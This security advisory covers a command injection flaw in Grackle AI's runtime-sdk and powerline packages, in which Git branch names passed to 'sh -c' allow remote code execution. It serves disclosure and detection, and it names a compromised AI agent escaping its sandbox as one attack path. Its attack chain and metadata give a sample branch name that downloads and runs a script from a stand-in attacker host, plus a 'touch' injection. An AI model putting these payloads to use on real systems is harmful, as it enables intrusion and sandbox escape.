---
title: Grackle AI Runtime-SDK RCE via Git Worktree Command Injection
slug: 2026-07-grackle-ai-rce
description: A command injection vulnerability (GHSA-vv65-f55v-xm6g) exists in Grackle AI's `@grackle-ai/runtime-sdk` and `@grackle-ai/powerline` components, allowing an attacker to achieve remote code execution as the PowerLine user on provisioned environments by injecting commands into unsanitized Git task branch names via the `SpawnSession` RPC.
date: "2026-07-03T11:45:08Z"
type: advisory
types:
  - advisory
severities:
  - high
tags:
  - command-injection
  - rce
  - supply-chain
  - nodejs
  - git
vendors:
  - Grackle AI
products:
  - '@grackle-ai/runtime-sdk (<= 0.132.1)'
  - '@grackle-ai/powerline (<= 0.132.1)'
affected_os:
  - Linux
mitre_ttps:
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: Command and Scripting Interpreter
    evidence: 'Exploit: set a task branch to `x;curl http://attacker/x.sh|sh;#` or `$(touch /tmp/pwned)`. `ensureWorktree` runs it under `sh -c`, yielding RCE as the PowerLine user.'
    confidence_band: high
  - tactic_id: TA0001
    tactic_name: Initial Access
    technique_id: T1190
    technique_name: Exploit Public-Facing Application
    evidence: A caller able to reach the PowerLine `SpawnSession` RPC (a malicious or compromised agent acting through the orchestration layer, or any client able to spawn a task) can achieve arbitrary command execution
    confidence_band: high
references:
  - https://github.com/advisories/GHSA-vv65-f55v-xm6g
rules:
  - title: Detect GHSA-vv65-f55v-xm6g Grackle AI RCE via Git Worktree Injection
    description: Detects exploitation of GHSA-vv65-f55v-xm6g in Grackle AI's runtime-sdk, where shell metacharacters in Git branch names lead to remote code execution via `sh -c`.
    platform: sigma
    severity: high
    tactics:
      - execution
    techniques:
      - T1059.004
    data_sources:
      - process_creation
      - linux
rules_count: 1
---

A critical command injection vulnerability (GHSA-vv65-f55v-xm6g) affects Grackle AI's `@grackle-ai/runtime-sdk` and `@grackle-ai/powerline` components, specifically versions `0.132.1` and earlier. The flaw stems from the `NODE_GIT_EXECUTOR` utilizing `shell:true` when executing `git worktree` operations, combined with the unsanitized `branch` name flowing from the `SpawnSession` gRPC request into the command arguments. This allows a malicious or compromised agent, or any client able to initiate a task via the `SpawnSession` RPC, to inject arbitrary shell commands. These commands are then executed with the privileges of the PowerLine user on provisioned environments, including SSH hosts, Docker containers, and Codespaces, effectively enabling remote code execution and escaping the agent's sandbox. A secondary, less impactful, argument injection vulnerability also exists due to a missing `--` separator.

## Attack Chain

1.  An attacker gains the ability to make calls to the PowerLine `SpawnSession` gRPC RPC. This could be through a compromised agent within the victim's environment, a malicious internal actor, or by exploiting another external vulnerability that exposes this RPC.
2.  The attacker crafts a Git branch name containing shell metacharacters and arbitrary commands, for example, `x;curl http://attacker/x.sh|sh;#` or `$(touch /tmp/pwned)`.
3.  The attacker sends a `SpawnSession` gRPC request to the PowerLine server, providing the crafted malicious branch name as a parameter within the request payload.
4.  The vulnerable `ensureWorktree` function, located in `packages/runtime-sdk/src/worktree.ts`, prepares to execute a `git worktree add` command using the `NODE_GIT_EXECUTOR.exec` function.
5.  Due to the `shell:true` option being implicitly passed to `NODE_GIT_EXECUTOR.exec`, Node.js concatenates the `git` command and its arguments (including the malicious branch name) into a single string.
6.  This concatenated string is then passed to `sh -c`, which interprets the shell metacharacters and executes the attacker's injected commands embedded within the branch name.
7.  The injected commands (e.g., `curl` to download and execute a malicious script, `touch` for arbitrary file creation) are executed by the `sh -c` process with the privileges of the PowerLine user.
8.  The attacker successfully achieves remote code execution, gaining control over the targeted provisioned environment (SSH host, Docker container, or Codespace) as the PowerLine user.

## Impact

Successful exploitation of this vulnerability leads to remote code execution (RCE) with the privileges of the PowerLine user on any provisioned environment where the Grackle AI runtime is deployed. This allows attackers to escape the agent sandbox, gain full control over the affected host (be it an SSH host, Docker container, or Codespace), and potentially access sensitive data, escalate privileges, or establish persistence within the victim's infrastructure. While no specific victim count or targeted sectors are mentioned, any organization utilizing Grackle AI's runtime-sdk in their development or deployment pipelines is at risk.

## Recommendation

*   Prioritize patching the affected Grackle AI components to address GHSA-vv65-f55v-xm6g by updating `@grackle-ai/runtime-sdk` and `@grackle-ai/powerline` beyond version `0.132.1`.
*   Deploy the Sigma rule "Detect GHSA-vv65-f55v-xm6g Grackle AI RCE via Git Worktree Injection" to your SIEM and tune for your environment to identify potential exploitation attempts.
*   Review the remediation steps for GHSA-vv65-f55v-xm6g which include removing `shell:true` from `NODE_GIT_EXECUTOR` and adding `--` separators for `git worktree add` invocations.
*   Implement defense-in-depth measures by validating the `branch` parameter at the gRPC boundary in `grpc-server.ts` to reject names containing shell metacharacters or invalid Git ref rules.
